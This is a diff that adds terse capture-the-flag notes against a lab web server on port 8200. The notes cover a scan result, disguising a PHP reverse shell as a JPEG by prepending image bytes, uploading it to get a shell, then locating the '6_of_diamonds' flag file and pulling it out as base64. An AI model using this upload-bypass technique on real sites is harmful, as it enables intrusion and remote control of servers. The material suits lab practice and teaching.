@@ -1,0 +1,23 @@
+# Target
+8200/tcp open  http        Apache httpd 2.4.38 ((Debian))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Home
+
+curl http://172.15.27.21:8200/images/rebekah-blocker-_ql9y7ddH2U-unsplash.jpg -o rebekah.jpg
+
+head -n 20 rebekah.jpg > rev.jpg.php
+cat rev.php >> rev.jpg.php
+
+Upload rev.jpg.php
+
+Access http://172.15.27.21:8200/images/rev.jpg.php
+	get reverse shell
+
+find / -name "6_of_diamonds.png" 2>/dev/null
+	/var/www/html/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png
+
+base64 /var/www/html/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png
+
+cat base64_encode | base64 -d > 6_of_diamonds.png
